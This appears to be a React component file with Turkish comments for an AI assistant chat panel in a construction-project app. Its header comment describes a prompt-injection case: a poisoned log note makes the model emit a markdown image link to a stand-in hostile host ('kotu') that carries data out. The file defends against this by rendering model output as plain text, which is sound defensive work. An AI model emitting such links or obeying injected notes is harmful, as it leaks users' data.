"use client";

import { SparkleIcon } from "@/components/ui/icons";
import { CopyIcon, ThumbDownIcon, ThumbUpIcon } from "./AiIcons";
import "./ai-panel.css";

/**
 * Sohbet baloncukları — `AI Chat.dc.html` 137-320 birebir.
 *
 * 🔴🔴 **MODEL ÇIKTISI DÜZ METİNDİR VE ÖYLE KALIR.** Markdown çözülmez, HTML
 * basılmaz, `dangerouslySetInnerHTML` YOKTUR ve model metninden `<img>`/`<a
 * href>` ÜRETİLMEZ. Sebep ölçülmüş bir saldırı yolu: CSP `img-src 'self'`
 * olduğu için uzak bir görsel yüklenemez ama **istek yine de çıkar**;
 * zehirlenmiş bir şantiye günlüğü notu modele `![](https://kotu/?d=<veri>)`
 * ürettirirse tarayıcı o isteği kullanıcı TIKLAMADAN atar ve veri sızar. Düz
 * metin bu vektörü yapısal olarak kapatır — bir süzgeç değil, bir yokluk.
 *
 * 🔴 Mockup'ın zengin kartları bu savunmayı GEVŞETEREK gelmedi: `AiBlockList`
 * onları **araç sonucunun yapısal verisinden** çizer (`AiBlocks.tsx`), model
 * metninden değil.
 *
 * 🔴 Mockup'ın 👍 👎 ⧉ glifleri SVG'ye çevrildi: `symbol-subset-guard` bu üç
 * kod noktasını alt küme DIŞI sayıyor ve ubuntu-latest'te fontconfig ikamesine
 * düşerdi — kare CI'da yereldekinden FARKLI çizilirdi (AI-1'de 🤖 ile aynı
 * kusur ölçülmüştü). Anlam korunur, taşıyıcı değişir.
 */

/** Ad soyaddan iki harflik avatar (mockup 141: "AY"). */
export function basHarfler(adSoyad: string | null): string {
  if (!adSoyad) return "?";
  const parcalar = adSoyad.trim().split(/\s+/u).filter(Boolean);
  if (parcalar.length === 0) return "?";
  const ilk = parcalar[0]?.[0] ?? "";
  const son = parcalar.length > 1 ? (parcalar[parcalar.length - 1]?.[0] ?? "") : "";
  return (ilk + son).toLocaleUpperCase("tr-TR");
}

export function saatDamgasi(t: Date): string {
  return t.toLocaleTimeString("tr-TR", { hour: "2-digit", minute: "2-digit" });
}

/** Mockup 320: "1,8 sn". 🔴 Süre bilinmiyorsa damga HİÇ basılmaz, 0 basılmaz. */
export function sureMetni(ms: number | null): string | null {
  if (ms === null || !Number.isFinite(ms)) return null;
  return `${(ms / 1000).toLocaleString("tr-TR", { minimumFractionDigits: 1, maximumFractionDigits: 1 })} sn`;
}

export interface AiUserMessageProps {
  metin: string;
  adSoyad: string | null;
  damga: string | null;
}

/** Mockup 137-142 — sağa yaslı balon + saat + "AY" avatarı. */
export function AiUserMessage({ metin, adSoyad, damga }: AiUserMessageProps) {
  return (
    <div className="ai-msg ai-msg--user">
      <div className="ai-msg__col">
        <div className="ai-bubble ai-bubble--user">{metin}</div>
        {damga ? <p className="ai-msg__stamp">{damga}</p> : null}
      </div>
      <div className="ai-avatar ai-avatar--user" aria-hidden="true">
        {basHarfler(adSoyad)}
      </div>
    </div>
  );
}

export interface AiFeedbackBarProps {
  damga: string | null;
  sure: string | null;
  metin: string;
}

/**
 * Mockup 314-320 — geri bildirim şeridi.
 *
 * 🔴 K3: 👍/👎 bir uca BAĞLANMADI (geri bildirim toplama uçları yok). Kanon
 * gereği SİLİNMEZ, **devre dışı + sebep** basılır. `⧉ Kopyala` ise gerçekten
 * çalışır: hiçbir uca ihtiyacı yok.
 */
export const GERI_BILDIRIM_KAPALI =
  "Geri bildirim toplama bu sürümde kapalı; kaydedilecek bir uç yok.";

export function AiFeedbackBar({ damga, sure, metin }: AiFeedbackBarProps) {
  const kopyala = () => {
    void globalThis.navigator?.clipboard?.writeText(metin);
  };
  return (
    <div className="ai-feedback">
      <button
        type="button"
        className="ai-feedback__btn"
        disabled
        title={GERI_BILDIRIM_KAPALI}
        aria-label="Yararlı buldum (bu sürümde kapalı)"
      >
        <ThumbUpIcon />
      </button>
      <button
        type="button"
        className="ai-feedback__btn"
        disabled
        title={GERI_BILDIRIM_KAPALI}
        aria-label="Yararlı bulmadım (bu sürümde kapalı)"
      >
        <ThumbDownIcon />
      </button>
      <button
        type="button"
        className="ai-feedback__btn ai-feedback__btn--text"
        onClick={kopyala}
        disabled={metin.length === 0}
      >
        <CopyIcon />
        Kopyala
      </button>
      {damga ? (
        <span className="ai-feedback__stamp">{sure ? `${damga} · ${sure}` : damga}</span>
      ) : null}
    </div>
  );
}

export interface AiAssistantMessageProps {
  /** Model metni — DÜZ METİN olarak basılır. */
  metin: string;
  children?: React.ReactNode;
  altBilgi?: React.ReactNode;
}

export function AiAssistantMessage({ metin, children, altBilgi }: AiAssistantMessageProps) {
  return (
    <div className="ai-msg ai-msg--assistant">
      <div className="ai-avatar" aria-hidden="true">
        <SparkleIcon />
      </div>
      <div className="ai-answer">
        {metin.length > 0 ? <p className="ai-answer__text">{metin}</p> : null}
        {children}
        {altBilgi}
      </div>
    </div>
  );
}

export interface AiTypingIndicatorProps {
  /** Mockup 328: "Hakediş verileri okunuyor…" — ETİKETLİ gösterge. */
  etiket: string;
}

/**
 * Mockup 322-331 — üç noktalı nabız + **etiket**.
 *
 * 🔴 Etiket sabit DEĞİL: o anda koşan aracın adından türetilir. Sabit yazsaydık
 * "hakediş verileri okunuyor" cümlesi stok sorgusunda da çıkar ve ekran yalan
 * söylerdi.
 */
export function AiTypingIndicator({ etiket }: AiTypingIndicatorProps) {
  return (
    <div className="ai-msg ai-msg--assistant" data-testid="ai-yaziyor">
      <div className="ai-avatar" aria-hidden="true">
        <SparkleIcon />
      </div>
      <div className="ai-typing">
        <span className="ai-typing__dots" aria-hidden="true">
          <span className="ai-typing__dot" />
          <span className="ai-typing__dot" />
          <span className="ai-typing__dot" />
        </span>
        <span className="ai-typing__label">{etiket}</span>
      </div>
    </div>
  );
}

export interface AiWelcomeProps {
  adSoyad: string | null;
}

export function AiWelcome({ adSoyad }: AiWelcomeProps) {
  return (
    <div className="ai-welcome-wrap">
      <div className="ai-welcome">
        <div className="ai-welcome__emoji" aria-hidden="true">
          <SparkleIcon width={28} height={28} />
        </div>
        <p className="ai-welcome__title">FİİL AI Asistanı</p>
        <p className="ai-welcome__text">
          {adSoyad ? `Merhaba ${adSoyad}! ` : "Merhaba! "}
          Proje verilerinizi analiz edebilir ve sorularınızı yanıtlayabilirim. Yalnızca sizin
          yetkiniz olan verileri görebilirim.
        </p>
      </div>
    </div>
  );
}
